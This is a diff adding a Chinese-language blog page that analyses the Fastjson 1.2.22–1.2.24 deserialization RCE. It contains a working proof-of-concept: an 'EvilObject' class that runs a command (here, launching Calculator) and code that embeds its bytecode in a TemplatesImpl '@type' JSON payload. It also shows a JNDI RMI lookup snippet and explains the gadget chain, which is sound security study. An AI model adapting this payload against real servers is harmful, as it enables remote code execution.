@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open Sans:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"erictanghulu.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文用fastjson爆出的第一个漏洞进行原理分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson历史漏洞分析(二)--1.2.22≤ Fastjson ≤1.2.24 RCE漏洞分析">
+<meta property="og:url" content="http://erictanghulu.github.io/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/index.html">
+<meta property="og:site_name" content="Veritas">
+<meta property="og:description" content="本文用fastjson爆出的第一个漏洞进行原理分析">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://erictanghulu.github.io/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled.png">
+<meta property="og:image" content="http://erictanghulu.github.io/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled1.png">
+<meta property="og:image" content="http://erictanghulu.github.io/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled2.png">
+<meta property="og:image" content="http://erictanghulu.github.io/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled3.png">
+<meta property="article:published_time" content="2021-11-18T03:43:50.000Z">
+<meta property="article:modified_time" content="2021-11-24T07:51:23.592Z">
+<meta property="article:author" content="Veritas">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="fastjson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://erictanghulu.github.io/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled.png">
+
+<link rel="canonical" href="http://erictanghulu.github.io/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Fastjson历史漏洞分析(二)--1.2.22≤ Fastjson ≤1.2.24 RCE漏洞分析 | Veritas</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Veritas</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">This is a subtitle</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://erictanghulu.github.io/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Veritas">
+      <meta itemprop="description" content="Life is fantastic">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veritas">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Fastjson历史漏洞分析(二)--1.2.22≤ Fastjson ≤1.2.24 RCE漏洞分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-11-18 11:43:50" itemprop="dateCreated datePublished" datetime="2021-11-18T11:43:50+08:00">2021-11-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-11-24 15:51:23" itemprop="dateModified" datetime="2021-11-24T15:51:23+08:00">2021-11-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p><strong>本文用fastjson爆出的第一个漏洞进行原理分析</strong></p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="1、背景"><a href="#1、背景" class="headerlink" title="1、背景"></a>1、背景</h2><p>fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 <a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">https://github.com/alibaba/fastjson/wiki/security_update_20170315</a></p>
+<h2 id="2、受影响版本"><a href="#2、受影响版本" class="headerlink" title="2、受影响版本"></a>2、受影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.2.22 &lt;= fastjson &lt;= 1.2.24</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、反序列化流程"><a href="#3、反序列化流程" class="headerlink" title="3、反序列化流程"></a>3、反序列化流程</h2><p>这里为了更好的理解整个漏洞的流程以及利用链在网上找了个demo进行调试一下</p>
+<h3 id="3-1-测试代码"><a href="#3-1-测试代码" class="headerlink" title="3.1 测试代码"></a>3.1 测试代码</h3><p><strong>EvilObject</strong></p>
+<p>这个是我们需要反序列化的恶意类，可以看到在实例化的时候会执行恶意代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        EvilObject evilObject = <span class="keyword">new</span> EvilObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>TemplatesImplPoc</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 影响范围 1.2.22 &lt;= fastjson &lt;= 1.2.24</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">templatesImplPoc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">&quot;user.dir&quot;</span>) + <span class="string">&quot;/fastjson/target/classes/barcelona/littlet1gger/fastjson/EvilObject.class&quot;</span>;</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TemplatesImpl</span></span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String text1 = <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;LittleT1gger&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125; &quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            templatesImplPoc();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里重点关注一下text1中的内容</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String text1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>将<code>EvilObject</code> 编译后的.class作为<code>bytecodes</code>的值放进json中，<code>@type</code>指定了反序列的类为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> ,fastjson会根据指定类去反序列化得到该类的实例。在默认情况下，<code>fastjson</code>只会反序列化<code>public</code>属性，而<code>TemplatesImpl</code>中<code>_bytecodes</code>却是私有属性，<code>_name</code>也是私有属性，所以在<code>parseObject</code>的时候需要设置<code>Feature.SupportNonPublicField</code> (由于这个属性在<code>1.2.22</code> 才加入所以利用起来比较有局限性)，这样<code>_bytecodes</code>字段才会被反序列化。<code>_tfactory</code>这个字段在<code>TemplatesImpl</code>既没有<code>get</code>方法也没有<code>set</code>方法，通过设置<code>_tfactory</code>为<code>&#123; &#125;</code>,fastjson会调用其无参构造函数得<code>_tfactory</code>对象，这样就解决了某些版本中在<code>defineTransletClasses()</code>用到会引用<code>_tfactory</code>属性导致异常退出。</p>
+<h3 id="3-2-TemplatesImpl利用链分析"><a href="#3-2-TemplatesImpl利用链分析" class="headerlink" title="3.2 TemplatesImpl利用链分析"></a>3.2 TemplatesImpl利用链分析</h3><p>我们先重点关注一下在反射创建<code>TemplatesImpl</code>的过程中发生了什么</p>
+<p>将断点直接断在命令执行的那行，查看调用链</p>
+<p><img src="/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled.png" alt="Untitled"></p>
+<p><img src="/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled1.png" alt="Untitled"></p>
+<p>可以看到在反射创建<code>Templateslmpl</code> 的时候会调用其getter方法，其中这里出现问题的是<code>getOutputProperties()</code> 我们根据调用链可以很快速定位到<code>getTransletInstance()</code> 函数中</p>
+<p><img src="/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled2.png" alt="Untitled"></p>
+<p>发现在这里实例化了_class数组中的类，在这个场景下也就是我们所注入的恶意类<code>EvilObject</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br></pre></td></tr></table></figure>
+
+<p>可以往前关注到451行的<code>defineTransletClasses()</code> 其作用是将<code>_bytecodes</code> 转为<code>Class</code>并赋值给<code>_class</code> 这里截取<code>defineTransletClasses()</code>部分代码片段</p>
+<p><img src="/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled3.png" alt="Untitled"></p>
+<p>所以我们如果控制了<code>_bytecodes</code>的值就能达到目的，而<code>_bytecodes</code>的<code>setter</code>函数是私有的所以需要我们最开始提到的<code>Feature.SupportNonPublicField</code> 这个参数，而这也导致了这个利用链难度一下增高了。</p>
+<h3 id="3-3-JdbcRowSetImpl利用链分析（待完成）"><a href="#3-3-JdbcRowSetImpl利用链分析（待完成）" class="headerlink" title="3.3 JdbcRowSetImpl利用链分析（待完成）"></a>3.3 JdbcRowSetImpl利用链分析（待完成）</h3><p><strong>3.3.1 javax.naming.InitialContext#lookup()</strong></p>
+<p>了解这个利用链之前我们先来了解一下<code>javax.naming.InitialContext</code> 的<code>lookup</code>方法</p>
+<p><code>InitialContext</code> 是一个实现了<code>Context</code>接口的类，可以使用这个类作为JNDI命名服务的入口点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"><span class="comment">//com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factory</span></span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://LittleT1gger:8080&quot;</span>);</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">Object local_obj = ctx.lookup(<span class="string">&quot;rmi://LittleT1gger:8080/eval&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>以上是个初始化JNDI的过程，如果<code>lookup()</code>参数可控就有可能被攻击。原因是，在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过<code>References</code>类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过<code>Referenceable.getReference()</code>获取绑定对象的引用，并且在目录中保存。当客户端在<code>lookup()</code>查找这个远程对象时，客户端会获取相应的<code>object factory</code>，最终通过<code>factory</code>类将<code>reference</code>转换为具体的对象实例。而转为实例的过程中便会执行构造方法或静态代码块中的恶意方法达到RCE的目的</p>
+<h2 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h2><p>在这个漏洞中反序列化的类别可以被指定，并且输入的成员变量也可以被指定。</p>
+<p>注意默认构造方法、setter方法调用顺序，默认构造器在前，此时属性值还没有被赋值，所以即使默认构造器中存在危险方法，但是危害值还没有被传入，所以默认构造器按理来说不会成为漏洞利用方法，不过对于内部类那种，外部类先初始化了自己的某些属性值，但是内部类默认构造器使用了父类的属性的某些值，依然可能造成危害。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">fastjson 远程反序列化poc的构造和分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95">Fastjson反序列化漏洞基础</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag"># Java安全</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+              <a href="/tags/fastjson/" rel="tag"># fastjson</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/18/Fastjson(%E4%B8%89)-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20fabf2f65a91f47c281688b7941b4596e/" rel="prev" title="Fastjson历史漏洞分析(三)--历史漏洞分析">
+      <i class="fa fa-chevron-left"></i> Fastjson历史漏洞分析(三)--历史漏洞分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/18/Fastjson(%E4%B8%80)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2022cba1e1a9d34336a70b7cf31c47616f/" rel="next" title="Fastjson历史漏洞分析(一)--基础知识">
+      Fastjson历史漏洞分析(一)--基础知识 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E8%83%8C%E6%99%AF"><span class="nav-text">1、背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-text">2、受影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="nav-text">3、反序列化流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="nav-text">3.1 测试代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-text">3.2 TemplatesImpl利用链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E5%BE%85%E5%AE%8C%E6%88%90%EF%BC%89"><span class="nav-text">3.3 JdbcRowSetImpl利用链分析（待完成）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-text">4、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Veritas"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Veritas</p>
+  <div class="site-description" itemprop="description">Life is fantastic</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
